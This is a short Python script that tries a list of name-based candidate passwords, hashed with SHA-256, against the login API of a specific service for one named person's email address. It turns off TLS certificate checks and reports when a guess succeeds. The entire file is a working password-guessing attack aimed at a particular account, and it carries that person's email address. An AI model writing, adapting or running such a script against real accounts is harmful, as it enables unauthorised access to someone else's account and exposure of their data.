import requests
import hashlib
import urllib3

urllib3.disable_warnings()

url = "https://authentication.thinxview.com/api/auth/login/"
email = "aravind.m@gndsolutions.in"

passwords = ["Aravind@123", "Aravind@1234"]

for pwd in passwords:
    print(f"Testing: {pwd}")
    pwd_hash = hashlib.sha256(pwd.encode()).hexdigest()
    
    resp = requests.post(
        url,
        json={"email": email, "authMethod": "PASSWORD", "password": pwd_hash, "remember_me": True},
        headers={"Content-Type": "application/json"},
        verify=False,
        timeout=30
    )
    
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text}")
    print("-" * 40)
    
    if resp.status_code == 200:
        print(f"SUCCESS! Password '{pwd}' works!")
        break
